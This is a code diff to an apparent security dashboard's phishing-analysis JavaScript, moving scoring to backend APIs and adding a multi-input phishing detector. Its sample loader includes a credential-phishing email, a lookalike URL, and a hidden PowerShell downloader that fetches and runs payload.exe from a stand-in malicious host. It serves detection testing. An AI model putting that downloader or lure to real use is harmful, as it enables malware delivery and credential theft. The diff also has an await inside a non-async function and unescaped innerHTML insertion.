@@ -2671,65 +2813,38 @@ window.analyzePhishingEmail = function() {
   resultsPanel.innerHTML = `
     <div class="sandbox-blankslate">
       <div class="cyber-spinner" style="margin-bottom:12px;"></div>
-      <p class="blankslate-text font-mono text-cyan">Decoding SMTP handshake vectors, scanning body keywords...</p>
+      <p class="blankslate-text font-mono text-cyan" id="email-scan-progress">Decoding SMTP handshake vectors, scanning body keywords...</p>
     </div>
   `;
 
-  setTimeout(() => {
-    const lower = content.toLowerCase();
-    
-    const hasPaypalObfuscation = lower.includes('paypai') || lower.includes('paypa1');
-    const hasUrgentWords = lower.includes('urgent') || lower.includes('immediate') || lower.includes('suspension') || lower.includes('restricted') || lower.includes('locked');
-    const hasFailSPF = lower.includes('spf: fail') || lower.includes('spf = fail');
-    const hasFailDKIM = lower.includes('dkim: fail') || lower.includes('dkim = fail');
-    const hasHttpUrl = /http:\/\/[^\s]+/.test(content);
-    
-    let riskPoints = 0;
-    const flags = [];
+  try {
+    const progressEl = document.getElementById('email-scan-progress');
+    const updateProgress = (text) => { if (progressEl) progressEl.innerText = text; };
 
-    if (hasPaypalObfuscation) {
-      riskPoints += 40;
-      flags.push('Homograph Obfuscation (Capital "I" used for "l" in PayPal)');
-    }
-    if (hasUrgentWords) {
-      riskPoints += 20;
-      flags.push('High-Urgency Directives / Coercion Tactics');
-    }
-    if (hasFailSPF) {
-      riskPoints += 25;
-      flags.push('SMTP SPF (Sender Policy Framework) Alignment: FAILED');
-    }
-    if (hasFailDKIM) {
-      riskPoints += 25;
-      flags.push('Cryptographic DKIM Domain Key Alignment: FAILED');
-    }
-    if (hasHttpUrl) {
-      riskPoints += 20;
-      flags.push('Unencrypted "http" URL hyperlink');
-    }
-    if (lower.includes('billing') || lower.includes('invoice') || lower.includes('funds') || lower.includes('transaction')) {
-      riskPoints += 10;
-      flags.push('Financial Loss Coercion Keywords');
-    }
+    setTimeout(() => updateProgress("Analyzing SPF/DKIM/DMARC headers..."), 800);
+    setTimeout(() => updateProgress("Evaluating text urgency vectors and financial coercion cues..."), 1800);
 
-    const overallScore = Math.min(riskPoints, 100);
-    let riskLevel = 'SECURE';
+    const resData = await fetchWithTimeoutAndRetry('/api/scan-email', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ emailText: content })
+    }, 3, 15000);
+
+    const overallScore = resData.riskScore;
+    const riskLevel = resData.threatLevel.toUpperCase();
     let riskClass = 'moderate';
     let textTitle = 'EMAIL HEADERS VERIFIED SAFE';
     let textColorClass = 'text-emerald';
 
-    if (overallScore > 75) {
-      riskLevel = 'CRITICAL';
+    if (riskLevel === 'CRITICAL' || riskLevel === 'HIGH') {
       riskClass = 'critical';
       textTitle = 'CRITICAL PHISHING RISK DETECTED';
       textColorClass = 'text-rose';
-    } else if (overallScore > 40) {
-      riskLevel = 'SUSPICIOUS';
+    } else if (riskLevel === 'MEDIUM') {
       riskClass = 'high';
       textTitle = 'SUSPICIOUS SENDER OR BODY FLAGS';
       textColorClass = 'text-amber';
-    } else if (overallScore > 10) {
-      riskLevel = 'LOW RISK';
+    } else if (riskLevel === 'LOW') {
       riskClass = 'moderate';
       textTitle = 'LOW SUSPICIOUS INDICATORS';
       textColorClass = 'text-cyan';
@@ -2742,16 +2857,16 @@ window.analyzePhishingEmail = function() {
             <h4 class="font-display ${textColorClass}" style="font-size:15px; font-weight:700; letter-spacing:0.5px;">
               ${textTitle}
             </h4>
-            <p style="font-size:11.5px; color:var(--text-muted); margin-top:2px;">Threat Probability Index: ${overallScore}%</p>
+            <p style="font-size:11.5px; color:var(--text-muted); margin-top:2px;">Threat Probability Index: ${overallScore}% | SPF: ${resData.spfStatus} | DKIM: ${resData.dkimStatus}</p>
           </div>
           <span class="risk-tag ${riskClass}" style="font-size:12px; padding:4px 10px;">${riskLevel}</span>
         </div>
 
         <div>
           <h5 style="font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px;">HEURISTIC THREAT DETECTIONS</h5>
-          ${flags.length > 0 ? `
+          ${resData.anomalies.length > 0 ? `
             <ul style="display:flex; flex-direction:column; gap:8px; padding-left:14px; list-style-type:square; font-family:var(--font-mono); font-size:12px; color:var(--text-secondary);">
-              ${flags.map(f => `<li><span class="${riskLevel === 'CRITICAL' ? 'text-rose' : 'text-amber'}">${f}</span></li>`).join('')}
+              ${resData.anomalies.map(f => `<li><span class="${riskLevel === 'CRITICAL' || riskLevel === 'HIGH' ? 'text-rose' : 'text-amber'}">${f}</span></li>`).join('')}
             </ul>
           ` : `
             <p style="font-size:12.5px; color:var(--text-secondary);">No known signature anomalies or spam trigger variables were matched in the text body or envelope strings.</p>
@@ -2759,28 +2874,228 @@ window.analyzePhishingEmail = function() {
         </div>
 
         <div style="padding:12px; background:rgba(3,7,18,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:6px;">
-          <h5 style="font-size:11.5px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">EMULATOR RECOMMENDATION</h5>
+          <h5 style="font-size:11.5px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">SECURITY COMPLIANCE BRIEFING</h5>
           <p style="font-size:12px; line-height:1.5; color:var(--text-muted);">
-            ${riskLevel === 'CRITICAL' 
-              ? '<strong>Action Required:</strong> DO NOT reply, click links, or input active LDAP credentials. The sender domain uses homograph tactics mimicking corporate endpoints.' 
-              : riskLevel === 'SUSPICIOUS' 
-              ? 'Exercise caution. Verify the sender identity out-of-band before downloading references or authorizing external gateway handshakes.'
-              : 'The email body appears normal, but remain vigilant for newly developed zero-day targeted social engineering phrases.'}
+            <strong>Analysis Details:</strong> ${resData.analysisDetails}<br/><br/>
+            <strong>Recommended Response:</strong> ${resData.recommendedAction}
           </p>
+        </div>
+
+        <div style="display:flex; gap:10px;">
+          <button class="btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="exportEmailReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(resData))))}')">Export JSON Report</button>
         </div>
       </div>
     `;
 
     logActivityEvent(`Analyzed Phishing Email. Verdict: ${riskLevel}`);
-    
     appState.scores.emails++;
     const emailCounter = document.getElementById('val-phishing-scans');
-    if (emailCounter) {
-      emailCounter.innerText = appState.scores.emails;
+    if (emailCounter) emailCounter.innerText = appState.scores.emails;
+
+    appendScanReportRow('Email Header Check', resData.senderAddress, `Score: ${overallScore}%`, riskLevel === 'SAFE' || riskLevel === 'LOW' ? 'SECURE' : 'SUSPICIOUS', `DKIM: ${resData.dkimStatus}`);
+
+  } catch (err) {
+    showNotification(err.message, 'error');
+    resultsPanel.innerHTML = `
+      <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright);">
+        <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">Email compliance engine offline</h4>
+        <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+      </div>
+    `;
+  }
+};
+
+window.exportEmailReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_email_scan_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON report downloaded successfully.', 'success');
+};
+
+/* ==========================================================================
+   UNIVERSAL ENTERPRISE PHISHING DETECTION ENGINE (NEW)
+   ========================================================================== */
+window.togglePhishingInputType = function() {
+  const type = document.getElementById('phishing-target-type').value;
+  const textContainer = document.getElementById('phishing-text-input-container');
+  const imageContainer = document.getElementById('phishing-image-input-container');
+  
+  if (type === 'image') {
+    textContainer.style.display = 'none';
+    imageContainer.style.display = 'flex';
+  } else {
+    textContainer.style.display = 'block';
+    imageContainer.style.display = 'none';
+  }
+};
+
+window.loadSamplePhishingVector = function() {
+  const type = document.getElementById('phishing-target-type').value;
+  const textInput = document.getElementById('phishing-universal-input');
+  
+  if (type === 'email') {
+    textInput.value = `From: support-security@micros0ft-login-compliance.net
+To: systems-admin@yourcompany.com
+Subject: ACTION REQUIRED: Critical Office 365 Domain Expiration Notice
+
+Dear Administrator,
+
+Your Microsoft Enterprise Office 365 licensing portal has reported active credential discrepancies. If you do not resolve these details within the next 4 hours, access to your cloud mailbox servers will be restricted.
+
+Verify your account credentials instantly here:
+http://micros0ft-login-security.net/enterprise-sso-gateway`;
+    showNotification('Office 365 phishing email template loaded.', 'success');
+  } else if (type === 'url') {
+    textInput.value = 'http://verification-portal-paypal.secure-banking-gate.com/login';
+    showNotification('PayPal lookalike phishing URL loaded.', 'success');
+  } else if (type === 'file') {
+    textInput.value = `function executePayload() {
+  var shell = new ActiveXObject("WScript.Shell");
+  var cmd = "powershell -nop -w hidden -c (New-Object Net.WebClient).DownloadFile('http://malicious-server.net/payload.exe', '%TEMP%\\\\update.exe'); Start-Process '%TEMP%\\\\update.exe'";
+  shell.Run(cmd, 0, true);
+}`;
+    showNotification('Suspicious downloader script snippet loaded.', 'success');
+  } else if (type === 'image') {
+    showNotification('Screenshot analysis requires manual visual file upload.', 'warning');
+  }
+};
+
+window.analyzePhishingUniversal = async function() {
+  const type = document.getElementById('phishing-target-type').value;
+  const resultsBox = document.getElementById('phishing-universal-results');
+  if (!resultsBox) return;
+
+  let content = '';
+
+  if (type === 'image') {
+    const previewImg = document.getElementById('phishing-image-preview');
+    if (!previewImg || !previewImg.src || previewImg.src === "" || previewImg.style.display === 'none') {
+      showNotification('Please drag or select an image screenshot first.', 'error');
+      return;
+    }
+    content = previewImg.src; // This is a Base64 data URL
+  } else {
+    const textInput = document.getElementById('phishing-universal-input');
+    content = textInput ? textInput.value.trim() : '';
+    if (!content) {
+      showNotification('Please input text or copy data to analyze.', 'error');
+      return;
+    }
+  }
+
+  showNotification('Interrogating target through ML phishing engine...', 'success');
+  resultsBox.innerHTML = `
+    <div class="sandbox-blankslate">
+      <div class="cyber-spinner" style="margin-bottom:12px;"></div>
+      <p class="blankslate-text font-mono text-cyan" id="phishing-universal-progress">Querying machine-learning model, running risk classifiers...</p>
+    </div>
+  `;
+
+  try {
+    const progressEl = document.getElementById('phishing-universal-progress');
+    const updateProgress = (text) => { if (progressEl) progressEl.innerText = text; };
+
+    setTimeout(() => updateProgress("Comparing against brand lookalike and typosquat databases..."), 1000);
+    setTimeout(() => updateProgress("Synthesizing confidence weights and technical briefing details..."), 2000);
+
+    const resData = await fetchWithTimeoutAndRetry('/api/scan-phishing-universal', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ type, content })
+    }, 3, 20000);
+
+    const score = resData.threatScore;
+    const rating = resData.threatLevel.toUpperCase();
+    let ratingClass = 'moderate';
+    let textTitle = 'VECTOR VERIFIED SECURE';
+    let textColorClass = 'text-emerald';
+
+    if (rating === 'CRITICAL' || rating === 'HIGH') {
+      ratingClass = 'critical';
+      textTitle = rating === 'CRITICAL' ? 'CRITICAL PHISHING RISK DETECTED' : 'HIGH DENSITY PHISHING VECTOR';
+      textColorClass = 'text-rose';
+    } else if (rating === 'MEDIUM') {
+      ratingClass = 'high';
+      textTitle = 'SUSPICIOUS SIGNAL SIGNATURES MATCHED';
+      textColorClass = 'text-amber';
+    } else if (rating === 'LOW') {
+      ratingClass = 'moderate';
+      textTitle = 'LOW PHISHING PROBABILITY';
+      textColorClass = 'text-cyan';
     }
 
-    appendScanReportRow('Email Header Check', 'Suspicious Email String', `Score: ${overallScore}%`, riskLevel === 'SECURE' ? 'SECURE' : 'SUSPICIOUS', 'N/A');
-  }, 1200);
+    resultsBox.innerHTML = `
+      <div style="display:flex; flex-direction:column; gap:16px;">
+        <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:12px;">
+          <div>
+            <h4 class="font-display ${textColorClass}" style="font-size:15px; font-weight:700; letter-spacing:0.5px;">
+              ${textTitle}
+            </h4>
+            <p style="font-size:11.5px; color:var(--text-muted); margin-top:2px;">Threat Score: ${score}/100 | Confidence: ${resData.confidenceScore}%</p>
+          </div>
+          <span class="risk-tag ${ratingClass}" style="font-size:12px; padding:4px 10px;">${rating}</span>
+        </div>
+
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 14px;">
+          <div style="padding:12px; background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
+            <p style="font-size:10px; color:var(--text-muted); font-weight:700;">IMPERSONATED BRAND</p>
+            <p style="font-size:14px; font-weight:700; color:#fff; margin-top:2px;">${resData.affectedBrand || 'None'}</p>
+          </div>
+          <div style="padding:12px; background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
+            <p style="font-size:10px; color:var(--text-muted); font-weight:700;">SYSTEM DIRECTIVE</p>
+            <p style="font-size:14px; font-weight:700; color:${resData.action === 'Block' ? 'var(--rose-bright)' : 'var(--emerald-bright)'}; margin-top:2px;">${resData.action}</p>
+          </div>
+        </div>
+
+        <div>
+          <h5 style="font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px;">TACTICAL INDICATORS FOUND</h5>
+          <div style="display:flex; flex-wrap:wrap; gap:6px;">
+            ${resData.indicators && resData.indicators.length > 0 ? resData.indicators.map(ind => `<span style="font-family:var(--font-mono); font-size:11px; padding:2px 8px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.05); border-radius:4px; color:var(--cyan-bright);">${ind}</span>`).join('') : '<span style="font-size:12px; color:var(--text-muted);">None detected</span>'}
+          </div>
+        </div>
+
+        <div style="padding:12px; background:rgba(3,7,18,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:6px;">
+          <h5 style="font-size:11.5px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">TACTICAL BRIEFING</h5>
+          <p style="font-size:12px; line-height:1.5; color:var(--text-muted);">
+            <strong>Trigger:</strong> ${resData.detectionReason}<br/><br/>
+            <strong>Detailed Intelligence:</strong> ${resData.details}<br/><br/>
+            <strong>Recommended Containment:</strong> ${resData.recommendedAction}
+          </p>
+        </div>
+
+        <div style="display:flex; gap:10px;">
+          <button class="btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="exportUniversalPhishingReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(resData))))}')">Export JSON Advisory</button>
+        </div>
+      </div>
+    `;
+
+    logActivityEvent(`Conducted Universal Phishing Check. Threat Score: ${score}%`);
+    appendScanReportRow('Universal Phishing Check', type.toUpperCase() + ' Source', `Threat Score: ${score}%`, rating === 'SAFE' || rating === 'LOW' ? 'SECURE' : 'SUSPICIOUS', `Action: ${resData.action}`);
+
+  } catch (err) {
+    showNotification(err.message, 'error');
+    resultsBox.innerHTML = `
+      <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright);">
+        <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">Phishing detection engine offline</h4>
+        <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+      </div>
+    `;
+  }
+};
+
+window.exportUniversalPhishingReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_phishing_advisory_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON Advisory downloaded successfully.', 'success');
 };
 
 /* Reports: PDF Export */
